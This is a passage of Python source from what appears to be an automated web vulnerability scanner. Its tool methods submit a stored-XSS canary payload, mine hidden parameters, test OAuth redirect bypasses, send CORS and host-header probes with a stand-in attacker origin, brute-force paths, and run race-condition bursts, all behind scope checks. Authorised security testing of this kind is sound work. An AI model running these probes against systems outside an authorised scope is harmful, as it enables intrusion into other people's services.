                    match = next((m for m in fired["msgs"] if marker in str(m)), None)
                    if match is not None:
                        hit = {"url": u, "msg": str(match)}
                        break
                await browser.close()
        except Exception:
            return hit
        return hit

    async def _run_stored_xss(self, inp: dict) -> ToolResult:
        """Second-order / STORED XSS: submit a unique EXECUTING canary into a form, then
        browser-load display pages and confirm it executes somewhere it wasn't directly
        reflected. Truth-first: confirmed only on real browser execution. INTRUSIVE — it
        persists a canary payload to the target, so it runs in Full mode only."""
        from urllib.parse import urlencode, urlparse
        url = inp["url"]
        if not self.scope.validate(url)[0]:
            return ToolResult("stored_xss", url, False, "", [], "out of scope")
        fields = [f for f in (inp.get("fields") or []) if isinstance(f, str)] or \
                 ["comment", "message", "body", "content", "text", "name"]
        marker = "bbhso" + os.urandom(5).hex()
        payload = f'"><svg onload=alert(\'{marker}\')>'
        body = urlencode({f: payload for f in fields[:8]})
        # 1) submit the canary
        r = await self._http(url, "POST", {"Content-Type": "application/x-www-form-urlencoded"},
                             body=body, capture=True)
        if r.get("error"):
            return ToolResult("stored_xss", url, True, f"canary submit failed: {r['error']}", [])
        # 2) browser-load the form page + a bounded sample of same-host HTML pages
        host = urlparse(url).netloc
        cand, seen = [url], {url}
        for u in self.urls:
            if len(cand) >= 9:
                break
            if urlparse(u).netloc == host and u not in seen and not any(
                    u.lower().split("?")[0].endswith(x)
                    for x in (".js", ".css", ".png", ".jpg", ".svg", ".gif", ".woff", ".ico")):
                cand.append(u); seen.add(u)
        hit = await self._browser_dialog_scan(cand, marker)
        if not hit:
            return ToolResult("stored_xss", url, True,
                              "canary submitted; no stored execution observed", [])
        finding = self._attach_poc({
            "severity": "high", "cwe": "CWE-79", "target": hit["url"],
            "title": f"Stored XSS (canary from {urlparse(url).path or url} fired on {urlparse(hit['url']).path or hit['url']})",
            "confidence": "confirmed", "family": "stored_xss", "tags": ["xss", "stored", "second-order"],
            "evidence": f"A payload submitted to {url} EXECUTED in a browser on {hit['url']} (alert fired with marker {marker}).",
            "impact": ("Stored XSS runs in every visitor's authenticated session — session/token theft, account "
                       "takeover, and worm-like propagation across users."),
            "false_positive_check": "Confirmed by real browser execution of the STORED payload on a display page, not by reflection.",
        }, url, None, method="POST", body=body,
            timing=f"headless Chromium executed the stored payload on {hit['url']} (marker {marker})")
        return ToolResult("stored_xss", hit["url"], True, "STORED XSS CONFIRMED", [finding])

    async def _run_anomaly_scan(self, inp: dict) -> ToolResult:
        """Anomaly hunting ('intuition' leads): fetch a page and flag verbose errors /
        stack traces / internal-path disclosure / debug + version-leak headers as
        advisory LEADS to chase. Truth-first: these are candidate 'dig here' signals,
        never confirmed vulnerabilities. ACTIVE (a single GET + analysis)."""
        import re as _re
        url = inp["url"]
        if not self.scope.validate(url)[0]:
            return ToolResult("anomaly", url, False, "", [], "out of scope")
        r = await self._http(url, "GET", capture=True)
        if r.get("error"):
            return ToolResult("anomaly", url, True, r["error"], [])
        body = r.get("body", "") or ""
        headers = {str(k).lower(): v for k, v in (r.get("headers") or {}).items()}
        findings = []
        for label, rx in _ANOMALY_RX:
            m = rx.search(body)
            if m:
                snip = body[max(0, m.start() - 25):m.start() + 70].replace("\n", " ")
                findings.append(self._anom_lead(url, label, f"Response shows {label}: …{snip}…"))
        hints = []
        for h in _LEAK_HEADERS:
            if h in headers:
                v = str(headers[h])
                if h in ("x-debug", "x-runtime", "x-aspnet-version", "x-aspnetmvc-version", "x-generator") \
                        or _re.search(r"\d", v):
                    hints.append(f"{h}: {v}")
        if hints:
            findings.append(self._anom_lead(url, "version/debug headers",
                                            "Headers leak stack/version info: " + "; ".join(hints[:5])))
        return ToolResult("anomaly", url, True, f"{len(findings)} anomaly lead(s)", findings)

    def _anom_lead(self, url: str, label: str, evidence: str) -> dict:
        return {"severity": "info", "confidence": "candidate", "family": "anomaly",
                "tags": ["anomaly", "intuition"], "cwe": "CWE-200", "target": url,
                "title": f"Anomaly — {label}", "evidence": evidence,
                "reproduction_steps": [f"Request {url} and inspect the response for {label}."],
                "analyst_notes": "Advisory hunt lead — dig here; not a confirmed vulnerability."}

    async def _run_param_mine(self, inp: dict) -> ToolResult:
        """Active PARAMETER MINING: brute-force hidden query params so injection probes
        reach inputs the crawl never saw. A candidate param that reflects its canary or
        changes the response vs a random-param baseline is a DISCOVERY — added to the
        surface (candidate lead, not a vuln). Intensity scales the wordlist. INTRUSIVE."""
        import httpx
        from urllib.parse import urlparse, urlencode, parse_qsl
        url = inp["url"]
        if not self.scope.validate(url)[0]:
            return ToolResult("param_mine", url, False, "", [], "out of scope")
        words = list(dict.fromkeys(_PARAM_WORDS + [w for w in (inp.get("words") or []) if isinstance(w, str)]))
        words = words[:self._ni(40, 80, len(words))]        # intensity widens the list
        canary = "bbhpm" + os.urandom(4).hex()
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        base = url.split("#")[0]

        def with_param(u, k, v):
            p = urlparse(u); q = dict(parse_qsl(p.query, keep_blank_values=True)); q[k] = v
            return f"{p.scheme}://{p.netloc}{p.path}?{urlencode(q)}"

        discovered = []
        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=12) as c:
            rnd = "zz" + os.urandom(4).hex()                 # a param that certainly does not exist
            try:
                br = await c.get(with_param(base, rnd, canary))
            except Exception:
                return ToolResult("param_mine", url, True, "baseline request failed", [])
            base_len, base_status, base_reflects = len(br.text), br.status_code, canary in br.text
            for w in words:
                tgt = with_param(base, w, canary)
                if not self.scope.validate(tgt)[0]:
                    continue
                try:
                    r = await c.get(tgt)
                except Exception:
                    continue
                reflected = (canary in r.text) and not base_reflects
                changed = (r.status_code != base_status) or (abs(len(r.text) - base_len) > max(64, base_len * 0.02))
                if reflected or changed:
                    discovered.append({"param": w, "reflected": reflected, "status": r.status_code,
                                       "lendiff": abs(len(r.text) - base_len), "url": with_param(base, w, "1")})
        if not discovered:
            return ToolResult("param_mine", url, True, f"no hidden params (tested {len(words)})", [])
        self._add_urls([d["url"] for d in discovered])       # feed the injection surface
        findings = []
        for d in discovered:
            why = "value reflected in the response" if d["reflected"] else \
                  f"changed the response (status {d['status']}, Δlen {d['lendiff']})"
            findings.append({
                "severity": "info", "confidence": "candidate", "family": "param_mine",
                "tags": ["recon", "param-mining"], "cwe": "CWE-200" if d["reflected"] else "",
                "target": d["url"], "title": f"Hidden parameter '{d['param']}' on {urlparse(base).path or base}",
                "evidence": f"Undocumented parameter '{d['param']}' {why}. Added to the surface for injection testing"
                            + (" (reflected → also XSS-worthy)." if d["reflected"] else "."),
                "reproduction_steps": [f"GET {d['url']} and compare to a baseline with a random parameter name."]})
        return ToolResult("param_mine", url, True,
                          f"{len(discovered)} hidden param(s) discovered → surface", findings)

    async def _run_dom_audit(self, inp: dict) -> ToolResult:
        """Dynamic client-side confirmation: drive a headless browser to CONFIRM
        DOM prototype pollution, DOM XSS, DOM open redirect, and CSTI (the classes
        static js_review can only flag as leads). Each check keys on a unique
        canary, so a hit is proof. Best-effort — skips cleanly with no browser."""
        import dom_tool as dom
        url = inp["url"]
        if not self.scope.validate(url)[0]:
            return ToolResult("dom_audit", url, False, "", [], "SCOPE BLOCK")
        chrome = _chrome_path()
        if not chrome:
            return ToolResult("dom_audit", url, True, "no headless browser — DOM audit skipped", [])
        try:
            from playwright.async_api import async_playwright
        except Exception:
            return ToolResult("dom_audit", url, True, "playwright unavailable — DOM audit skipped", [])
        os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
        findings, seen_cls = [], set()
        try:
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(
                    headless=True, executable_path=chrome,
                    args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
                try:
                    for probe in dom.build_probes(url):
                        if probe["class"] in seen_cls:      # one confirmation per class is enough
                            continue
                        ctx = await browser.new_context(ignore_https_errors=True)
                        if self.session_headers:
                            hdrs = {k: v for k, v in self.session_headers.items() if k.lower() != "cookie"}
                            if hdrs:
                                await ctx.set_extra_http_headers(hdrs)
                        await self._ctx_add_cookies(ctx)      # load authed pages logged-in
                        page = await ctx.new_page()
                        fired, navs = {"msg": None}, []

                        async def on_dialog(d):
                            fired["msg"] = d.message
                            try:
                                await d.dismiss()
                            except Exception:
                                pass
                        page.on("dialog", lambda d: asyncio.ensure_future(on_dialog(d)))
                        page.on("framenavigated", lambda fr: navs.append(fr.url))
                        # Also record top-level navigation REQUESTS: a real open
                        # redirect to a non-resolving attacker host (e.g. the reserved
                        # .example TLD) fires a navigation request but may never commit
                        # a framenavigated event. confirmed_redirect() host-matches, so
                        # the probe's own load (attacker host only in the fragment) is
                        # still excluded — this only adds genuine cross-host navigations.
                        def _on_request(r):
                            try:
                                if r.is_navigation_request():
                                    navs.append(r.url)
                            except Exception:
                                pass
                        page.on("request", _on_request)
                        try:
                            await page.goto(probe["nav"], wait_until="load", timeout=9000)
                            # CSTI needs the client-side template engine (AngularJS) to bootstrap
                            # and run a digest before {{7*7}} becomes 49 — wait for network idle.
                            if probe["class"] == "csti":
                                try:
                                    await page.wait_for_load_state("networkidle", timeout=5000)
                                except Exception:
                                    pass
                                await page.wait_for_timeout(900)
                            else:
                                await page.wait_for_timeout(350)
                        except Exception:
                            pass
                        pp_value, body = None, ""
                        try:
                            pp_value = await page.evaluate("window.Object.prototype[" + repr(dom.PP_KEY) + "]")
                        except Exception:
                            pass
                        try:
                            # read full HTML for CSTI (the evaluated marker can land in markup,
                            # not just visible text); innerText is enough for the other classes.
                            body = await page.evaluate(
                                "document.documentElement.outerHTML" if probe["class"] == "csti"
                                else "document.documentElement.innerText")
                        except Exception:
                            pass
                        f = dom.build_finding({**probe, "base": url}, pp_value=pp_value,
                                              nav_targets=navs, dialog_msg=fired["msg"], body=body)
                        if f:
                            # Capture a browser PoC for the report: a viewport screenshot
                            # (visual proof the bug fired in a real browser) plus a DOM
                            # snippet around the confirmation marker where one exists
                            # (e.g. CSTI's evaluated "49<MARK>"). Best-effort, size-capped.
                            try:
                                import base64 as _b64
                                _png = await page.screenshot(type="png", timeout=6000)
                                _b = _b64.b64encode(_png).decode()
                                if 0 < len(_b) <= 900000:          # ~675KB raw cap; keep report lean
                                    f["screenshot"] = "data:image/png;base64," + _b
                            except Exception:
                                pass
                            try:
                                _snip = await page.evaluate(
                                    "(m)=>{const h=document.documentElement.outerHTML;const i=h.indexOf(m);"
                                    "return i<0?'':h.slice(Math.max(0,i-120),i+160);}", "49" + dom.MARK)
                                if _snip:
                                    f["dom_snippet"] = _snip
                            except Exception:
                                pass
                            findings.append(f)
                            seen_cls.add(probe["class"])
                        try:
                            await ctx.close()
                        except Exception:
                            pass
                    await browser.close()
                except Exception:
                    pass
        except Exception as ex:
            return ToolResult("dom_audit", url, True, f"DOM audit error: {type(ex).__name__}", findings)
        if self.mission_id and findings:
            await self._http(url, "GET", capture=True)
        return ToolResult("dom_audit", url, True, f"{len(findings)} DOM issue(s) confirmed", findings)

    async def _run_js_review(self, inp: dict) -> ToolResult:
        import codereview as cr
        sources = []
        if inp.get("code"):
            sources.append((inp.get("source") or "inline-source", inp["code"]))
        urls = list(inp.get("urls") or [])
        if inp.get("url"):
            urls.append(inp["url"])
        if not sources and not urls:
            urls = [u for u in self.urls if u.lower().split("?")[0].endswith(".js")][:15]

        for u in urls[:20]:
            if not self.scope.validate(u)[0]:
                continue
            r = await self._http(u, "GET", capture=False)
            if not r.get("error") and r.get("body"):
                sources.append((u, r["body"]))
        if not sources:
            return ToolResult("js_review", "", True,
                              "No JS/source to review (crawl first, or pass url/urls/code)", [])

        import dependency_intel as dep
        findings, endpoints = [], []
        seen_comp = set()
        for label, text in sources:
            res = cr.review(text, label)
            findings += res["findings"]
            endpoints += res["endpoints"]
            # SCA: fingerprint library version from content + URL, map exact,
            # evidence-backed versions to known CVEs (guardrail: no version, no CVE).
            comps = dep.fingerprint_js_content(text, label) + dep.fingerprint_url(label)
            for comp in comps:
                key = (comp["name"], comp["version"])
                if not comp["version"] or key in seen_comp:
                    continue
                seen_comp.add(key)
                vulns = dep.assess_component(comp)
                if vulns:
                    findings.append(dep.vulnerable_component_finding(comp, vulns))
            # known client-side gadget libraries (e.g. deparam -> prototype pollution)
            for g in dep.gadget_findings(label):
                if (g["title"], g["target"]) not in seen_comp:
                    seen_comp.add((g["title"], g["target"]))
                    findings.append(g)

        # resolve + seed in-scope endpoints into the surface
        src_host = next((urlparse(l).netloc for l, _ in sources if l.startswith("http")), "")
        abs_eps = []
        for e in endpoints:
            if e.startswith("http"):
                abs_eps.append(e)
            elif e.startswith("/") and src_host:
                scheme = "https"
                abs_eps.append(f"{scheme}://{src_host}{e}")
        self._add_urls(abs_eps)

        seen, uniq = set(), []
        for f in findings:
            k = (f["title"], f.get("evidence", ""), f.get("target"))
            if k in seen:
                continue
            seen.add(k)
            uniq.append(f)
        self.recon.setdefault("js_review", []).append(
            {"sources": len(sources), "endpoints": len(set(endpoints))})
        return ToolResult("js_review", sources[0][0], True,
                          f"reviewed {len(sources)} source(s), {len(uniq)} finding(s), "
                          f"{len(set(endpoints))} endpoint(s)", uniq)

    async def _run_csrf(self, inp: dict) -> ToolResult:
        import csrf_tool as csrf
        url = inp["url"]
        r = await self._http(url, "GET", capture=True)
        if r.get("error"):
            return ToolResult("csrf", url, False, "", [], r["error"])
        set_cookie = ""
        for k, v in (r.get("headers") or {}).items():
            if k.lower() == "set-cookie":
                set_cookie = v
                break
        forms = csrf.parse_forms(r.get("body", ""), r.get("final_url") or url)
        findings = csrf.analyze(forms, set_cookie, url)
        return ToolResult("csrf", url, True,
                          f"{len(forms)} form(s), {len(findings)} CSRF signal(s)", findings)

    async def _run_oauth(self, inp: dict) -> ToolResult:
        import httpx
        import oauth_tool as oauth
        url = inp["url"]
        info = oauth.parse_authorize(url)
        if not info["is_oauth"]:
            return ToolResult("oauth", url, True,
                              "Not an OAuth authorization URL (needs client_id + redirect_uri/response_type)", [])
        endpoint, params = info["endpoint"], info["params"]
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, accepted, chain = [], [], []

        async def send(target):
            try:
                r = await c.get(target, headers=headers)
                return r.status_code, r.headers.get("location", "")
            except Exception:
                return 0, ""

        async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=15) as c:
            # 1) redirect_uri validation bypass
            for v in oauth.redirect_uri_variants(info["redirect_uri"]):
                target = oauth.build_authorize(endpoint, params, {"redirect_uri": v["value"]})
                status, loc = await send(target)
                verdict = oauth.analyze_redirect_response(status, loc)
                if verdict and verdict["accepted"] == "host":
                    accepted.append({**v, "location": verdict["location"]})
                elif verdict and verdict["accepted"] == "chain":
                    chain.append({**v, "location": verdict["location"]})
            if accepted:
                findings.append(oauth.redirect_finding(endpoint, accepted))
            elif chain:
                findings.append(oauth.redirect_finding(endpoint, chain, chain_only=True))
            # 2) missing-state CSRF (only meaningful if a state was present)
            if info["state"]:
                status, loc = await send(oauth.build_authorize(endpoint, params, {}, drop=["state"]))
                if oauth.analyze_state(status, loc):
                    findings.append(oauth.state_finding(endpoint))
            # 3) implicit-flow token leakage
            status, loc = await send(oauth.build_authorize(endpoint, params, {"response_type": "token"}))
            if oauth.analyze_token_leak(status, loc):
                findings.append(oauth.token_leak_finding(endpoint, loc))

        if self.mission_id and findings:
            await self._http(endpoint, "GET", capture=True)
        conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
        return ToolResult("oauth", endpoint, True,
                          f"{len(findings)} OAuth signal(s), {conf} confirmed", findings)

    async def _check_takeover(self, inp: dict) -> ToolResult:
        subs = inp.get("subdomains") or list(dict.fromkeys(self.recon.get("subdomains", [])))
        subs = [s for s in subs if self.scope.validate(s)[0]][:40]
        if not subs:
            return ToolResult("takeover", "", True, "No subdomains to check (run recon first)", [])
        candidates = []
        sem = asyncio.Semaphore(10)

        async def check(sub):
            async with sem:
                cname = await dns_recon.resolve_cname(sub)
                if not cname:
                    return
                r = await self._http(f"https://{sub}", capture=False)
                cand = dns_recon.match_takeover(sub, cname, r.get("status", 0), r.get("body", ""))
                if cand:
                    candidates.append(cand)

        await asyncio.gather(*[check(s) for s in subs])
        self.recon["takeover_candidates"].extend(candidates)
        return ToolResult("takeover", "", True, f"{len(candidates)} takeover candidate(s)", candidates)

    # ── INTRUSIVE ────────────────────────────────────────────────
    async def _run_ffuf(self, inp: dict) -> ToolResult:
        url = inp["url"]
        wl = inp.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        fc = inp.get("filter_codes", "404,403")
        method = inp.get("method", "GET")
        out, err = await self._cmd(
            ["ffuf", "-u", url, "-w", wl, "-fc", fc, "-X", method, "-json", "-s", "-t", "50"], timeout=240)
        if err.startswith("__MISSING__"):
            return ToolResult("ffuf", url, False, "", [], "ffuf not installed (use run_content_discovery instead)")
        findings = []
        try:
            data = json.loads(out)
            for r in data.get("results", []):
                findings.append({"url": r.get("url"), "status": r.get("status"), "length": r.get("length")})
        except Exception:
            pass
        base = url.split("FUZZ")[0].rstrip("/")
        self.recon["dir_bust"].setdefault(base, []).extend(findings)
        self._add_urls([f["url"] for f in findings if f.get("url")])
        return ToolResult("ffuf", url, True, f"{len(findings)} paths found", findings)

    async def _run_content_discovery(self, inp: dict) -> ToolResult:
        base_url = inp["base_url"].rstrip("/")
        max_paths = int(inp.get("max_paths", 120))
        words = ws.generate_discovery_words(base_url, self.urls)[:max_paths]
        # baseline: a definitely-nonexistent path (catch-all SPA detection)
        baseline = await self._http(f"{base_url}/bbh-nonexistent-{os.urandom(4).hex()}", capture=False)
        base_body = baseline.get("body", "")
        hits, findings = [], []
        sem = asyncio.Semaphore(12)

        async def probe_url(url):
            if not self.scope.validate(url)[0]:
                return
            async with sem:
                r = await self._http(url, capture=False)
            if r.get("error"):
                return
            hits.append({"url": url, "status": r["status"], "length": r["length"]})
            hit = ws.classify_sensitive_path_hit(
                urlparse(url).path, r["status"], r["body"],
                r["headers"].get("content-type", ""), base_body)
            if hit and hit["severity"] not in ("info",):
                findings.append({**hit, "url": url, "target": url})

        async def probe(word):
            await probe_url(ws.normalize_discovered_url(base_url, word))

        # API-first apps hide leaky endpoints UNDER discovered route directories
        # (e.g. /users/v1/_debug) that host-root discovery never reaches. Probe a
        # small curated info-leak suffix set beneath each discovered directory prefix.
        origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
        _LEAK_SUFFIXES = ("_debug", "debug", "dump", "admin", ".json")
        # a path that already contains a leak suffix must NOT become a prefix — else an
        # endpoint that accepts any trailing path (a permissive _debug) recursively
        # explodes into _debug/_debug/_debug/... and floods the whole surface.
        _leaky = ("_debug", "/debug", "/dump", "/export", "/admin/", "config")
        # discovered route directories ...
        prefixes = set()
        for u in self.urls:
            d = urlparse(u).path.rsplit("/", 1)[0]
            dl = d.lower()
            if (d and d not in ("", "/") and ".." not in d and len(d) < 80
                    and not any(s in dl for s in _leaky)):
                prefixes.add(d)
        # ... plus ubiquitous API base paths, so a leaky endpoint on an API-first app
        # whose routes aren't crawlable (e.g. a JSON API) is still reached.
        prefixes.update(("/api", "/api/v1", "/api/v2", "/v1", "/v2", "/rest",
                         "/admin", "/internal", "/management", "/users/v1", "/user/v1", "/books/v1"))
        route_urls = [f"{origin}{d}/{suf}" for d in sorted(prefixes)[:12] for suf in _LEAK_SUFFIXES]

        await asyncio.gather(*([probe(w) for w in words] + [probe_url(u) for u in route_urls]))
        for h in hits:
            self.recon["dir_bust"].setdefault(base_url, []).append(h)
        self._add_urls([h["url"] for h in hits if 200 <= (h["status"] or 0) < 400])
        return ToolResult("content_discovery", base_url, True,
                          f"{len(hits)} paths probed, {len(findings)} validated hits", findings)

    async def _run_web_probes(self, inp: dict) -> ToolResult:
        url = inp["url"]
        lab = bool(inp.get("lab_mode", False)) and self.lab_mode
        baseline = await self._http(url, capture=True)
        if baseline.get("error"):
            return ToolResult("web_probes", url, False, "", [], baseline["error"])
        findings = []

        # traversal
        for probe in ws.build_traversal_probes(url, lab_mode=lab):
            if not self.scope.validate(probe.url)[0]:
                continue
            r = await self._http(probe.url, capture=False)
            verdict = ws.analyze_traversal_pair(baseline, r, probe.payload, lab_mode=lab)
            if verdict:
                findings.append({
                    "title": f"Path traversal signal on '{probe.parameter}'",
                    "severity": verdict["severity"], "target": probe.url,
                    "description": f"Traversal probe ({probe.payload}) — {verdict['reason']}",
                    "evidence": f"{probe.payload}: {verdict['reason']}",
                    "confidence": verdict["confidence"], "family": "path_traversal",
                    "tags": ["lfi", "traversal"]})
        # idor
        for probe in ws.build_idor_probes(url):
            if not self.scope.validate(probe.url)[0]:
                continue
            r = await self._http(probe.url, capture=False)
            verdict = ws.analyze_idor_pair(baseline, r, cross_role=False)
            if verdict:
                findings.append({
                    "title": f"IDOR signal on '{probe.parameter}'",
                    "severity": verdict["severity"], "target": probe.url,
                    "description": f"Neighboring object ({probe.payload}) — {verdict['reason']}",
                    "evidence": f"{probe.payload}: {verdict['reason']}",
                    "confidence": verdict["confidence"], "family": "idor", "tags": ["idor"]})
        return ToolResult("web_probes", url, True,
                          f"{len(findings)} anomaly signal(s)", findings)

    async def _run_injection_probes(self, inp: dict) -> ToolResult:
        import httpx
        url = inp["url"]
        findings = []
        origin = "https://bbh-evil.example"
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        try:
            async with httpx.AsyncClient(verify=False, timeout=15, headers=headers) as c:
                base = await c.get(url)
                base_body = base.text
                # CORS
                try:
                    cr = await c.get(url, headers={"Origin": origin})
                    v = ws.analyze_cors(origin, dict(cr.headers))
                    if v:
                        self.recon["misc"].append({"type": "CORS Misconfiguration", "url": url,
                                                   "severity": v["severity"], "detail": v["detail"]})
                        findings.append({"title": "CORS misconfiguration", "severity": v["severity"].lower(),
                                         "target": url, "description": f"Endpoint {v['detail']} (ACAO={v.get('acao')}).",
                                         "family": "cors", "tags": ["cors"]})
                except Exception:
                    pass
                # host-header injection
                try:
                    hh = await c.get(url, headers={"Host": ws._EVIL_HOST, "X-Forwarded-Host": ws._EVIL_HOST},
                                     follow_redirects=False)
                    v = ws.analyze_host_header(hh.text, hh.headers.get("location", ""))
                    if v:
                        findings.append({"title": "Host header injection", "severity": v["severity"].lower(),
                                         "target": url, "description": v["detail"],
                                         "family": "host_header", "tags": ["hostheader"]})
                except Exception:
                    pass
                # open redirect
                for probe in ws.build_redirect_probes(url):
                    if not self.scope.validate(probe.url)[0]:
                        continue
                    try:
                        rr = await c.get(probe.url, follow_redirects=False)
                        v = ws.analyze_open_redirect(rr.status_code, rr.headers.get("location", ""), str(rr.url))
                        if v:
                            findings.append({"title": f"Open redirect on '{probe.parameter}'",
                                             "severity": v["severity"].lower(), "target": probe.url,
                                             "description": v["detail"], "family": "open_redirect",
                                             "tags": ["redirect"]})
                            break
                    except Exception:
                        pass
                # SSTI
                for probe in ws.build_ssti_probes(url):
                    if not self.scope.validate(probe.url)[0]:
                        continue
                    try:
                        sr = await c.get(probe.url)
                        v = ws.analyze_ssti(base_body, sr.text)
                        if v:
                            findings.append({"title": f"Server-side template injection on '{probe.parameter}'",
                                             "severity": v["severity"].lower(), "target": probe.url,
                                             "description": v["detail"], "family": "ssti", "tags": ["ssti"]})
                            break
                    except Exception:
                        pass
                # CRLF / response-header injection
                for probe in ws.build_crlf_probes(url):
                    if not self.scope.validate(probe.url)[0]:
                        continue
                    try:
                        cl = await c.get(probe.url, follow_redirects=False)
                        v = ws.analyze_crlf(dict(cl.headers), cl.status_code)
                        if v:
                            _crlf = {"title": f"CRLF / response-header injection on '{probe.parameter}'",
                                     "severity": v["severity"].lower(), "target": probe.url,
                                     "description": v["detail"],
                                     "evidence": f"the injected marker '{ws.CRLF_MARKER}' surfaced as a distinct RESPONSE HEADER",
                                     "impact": ("Attacker-controlled response headers enable web cache poisoning (serving a "
                                                "malicious page to other visitors), Set-Cookie injection/fixation, and "
                                                "redirect/phishing under the trusted domain."),
                                     "confidence": "confirmed", "cwe": "CWE-113",
                                     "family": "crlf", "tags": ["crlf", "response-splitting"],
                                     "reproduction_steps": [
                                         f"Send the request below (an encoded CR/LF + marker header injected into '{probe.parameter}').",
                                         f"Read the RESPONSE headers (curl -i) and confirm a distinct '{ws.CRLF_MARKER}' header is present.",
                                         "Repeat without the CR/LF payload and confirm the header disappears (rules out reflection)."],
                                     "false_positive_check": (f"The '{ws.CRLF_MARKER}' value appears as a real, separate response HEADER "
                                                              "(not in the body), so the injected CR/LF actually split the header stream.")}
                            findings.append(self._attach_poc(_crlf, probe.url, cl))
                            break
                    except Exception:
                        pass
        except Exception as e:
            return ToolResult("injection_probes", url, False, "", [], str(e))
        # capture baseline evidence
        if self.mission_id:
            await self._http(url, capture=True)
        return ToolResult("injection_probes", url, True, f"{len(findings)} reflection signal(s)", findings)

    async def _run_bfla(self, inp: dict) -> ToolResult:
        import httpx
        url = inp["url"]
        test_headers = dict(inp.get("headers") or {})
        allow_delete = bool(inp.get("allow_delete", False))
        methods = list(authz.SAFE_SWEEP) + (["DELETE"] if allow_delete else [])
        method_results, anon_results = {}, {}

        async def send(c, method, headers):
            body = b"{}" if method in ("POST", "PUT", "PATCH") else None
            h = dict(headers)
            if body:
                h.setdefault("Content-Type", "application/json")
            r = await c.request(method, url, headers={"User-Agent": _UA, **h}, content=body)
            return {"status": r.status_code, "length": len(r.content)}

        async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=15) as c:
            for m in methods:
                try:
                    method_results[m] = await send(c, m, test_headers)
                except Exception:
                    pass
                try:
                    anon_results[m] = await send(c, m, {})
                except Exception:
                    pass
            nonexistent = {}
            p = urlparse(url)
            segs = (p.path or "").rstrip("/").split("/")
            if segs and segs[-1]:
                segs[-1] = "bbh-nonexistent-" + os.urandom(3).hex()
                ne_url = urlunparse(p._replace(path="/".join(segs)))
                try:
                    rn = await c.get(ne_url, headers={"User-Agent": _UA, **test_headers})
                    nonexistent = {"status": rn.status_code, "length": len(rn.content)}
                except Exception:
                    pass

        findings = authz.analyze_methods(url, method_results, anon_results)
        findings += authz.analyze_side_channel(nonexistent, method_results.get("GET") or {})
        if self.mission_id:
            await self._http(url, "GET", test_headers, capture=True)
        return ToolResult("bfla", url, True, f"{len(findings)} authorization signal(s)", findings)

    async def _run_race(self, inp: dict) -> ToolResult:
        import httpx
        import race_tool as race
        url = inp["url"]
        method = (inp.get("method") or "POST").upper()
        headers = {"User-Agent": _UA, **(self.session_headers or {}), **(inp.get("headers") or {})}
        body = inp.get("body")
        content = body.encode() if isinstance(body, str) and body else None
        count = max(2, min(int(inp.get("count", 20)), 60))
        rounds = max(1, min(int(inp.get("rounds", 3)), 5))
        verify_url = inp.get("verify_url")
        if verify_url and not self.scope.validate(verify_url)[0]:
            verify_url = None  # drop off-scope verify endpoint
        verify_headers = {"User-Agent": _UA, **(self.session_headers or {}),
                          **(inp.get("verify_headers") or inp.get("headers") or {})}

        limits = httpx.Limits(max_connections=count + 4, max_keepalive_connections=count + 4)

        def make_client():
            # HTTP/2 multiplexes the burst over one warmed connection (closest to a
            # single-packet race); fall back cleanly if the h2 package is absent.
            try:
                return httpx.AsyncClient(verify=False, follow_redirects=False, timeout=20,
                                         http2=True, limits=limits)
            except Exception:
                return httpx.AsyncClient(verify=False, follow_redirects=False, timeout=20, limits=limits)

        async def read_state(c):
            try:
                r = await c.get(verify_url, headers=verify_headers)
                return {"status": r.status_code, "length": len(r.content), "body": r.text[:2000]}
            except Exception:
                return {}

        best, best_verify, best_score = [], None, (-1, -1)
        async with make_client() as c:
            # warm the pool without triggering the action (OPTIONS, not the method)
            try:
                await c.request("OPTIONS", url, headers=headers)
            except Exception:
                pass
            for _ in range(rounds):
                before = await read_state(c) if verify_url else None
                gate = asyncio.Event()

                async def worker():
                    await gate.wait()          # all workers park here first...
                    try:
                        r = await c.request(method, url, headers=headers, content=content)
                        return {"status": r.status_code, "length": len(r.content)}
                    except Exception:
                        return {"status": 0, "length": 0}

                tasks = [asyncio.create_task(worker()) for _ in range(count)]
                await asyncio.sleep(0.05)       # ...let them all reach the gate...
                gate.set()                       # ...then release simultaneously
                results = await asyncio.gather(*tasks)
                after = await read_state(c) if verify_url else None
                v = race.verify_delta(before, after) if verify_url else None
                score = (1 if (v and v.get("changed")) else 0, race.summarize(results)["successes"])
                if score > best_score:
                    best, best_verify, best_score = results, v, score

        findings = race.analyze_race(url, best, count, rounds, verify=best_verify)
        if self.mission_id:
            await self._http(url, method, inp.get("headers") or {}, body=body, capture=True)
        s = race.summarize(best)
        changed = " · state changed" if (best_verify and best_verify.get("changed")) else ""
        return ToolResult("race", url, True,
                          f"best {s['successes']}/{count} over {rounds} round(s){changed}, {len(findings)} signal(s)",
                          findings)

    async def _run_ssrf(self, inp: dict) -> ToolResult:
        import time
        import httpx
        import collaborator as collab
        import ssrf_tool as ssrf
        url = inp["url"]
        params = inp.get("params") or ssrf.ssrf_params(url)
        params = [p for p in params][:self._ni(8, 12, 24)]
        if not params:
            return ToolResult("ssrf", url, True,
                              "No query parameters to test (SSRF needs a URL-ish parameter)", [])
        open_port = int(inp.get("open_port", 80))
        closed_port = int(inp.get("closed_port", 1))
        oob_domain = (inp.get("oob_domain") or os.getenv("BBH_OOB_DOMAIN", "")).strip()
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, evidence_targets = [], []

        async def probe(c, param, value, timeout):
            tgt = ssrf.set_param(url, param, value)
            if not self.scope.validate(tgt)[0]:
                return None
            t0 = time.perf_counter()
            try:
                r = await c.get(tgt, timeout=timeout)
                return {"status": r.status_code, "error": False,
                        "elapsed": time.perf_counter() - t0, "body": r.text, "target": tgt}
            except Exception:
                return {"status": 0, "error": True,
                        "elapsed": time.perf_counter() - t0, "body": "", "target": tgt}

        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers) as c:
            for p in params:
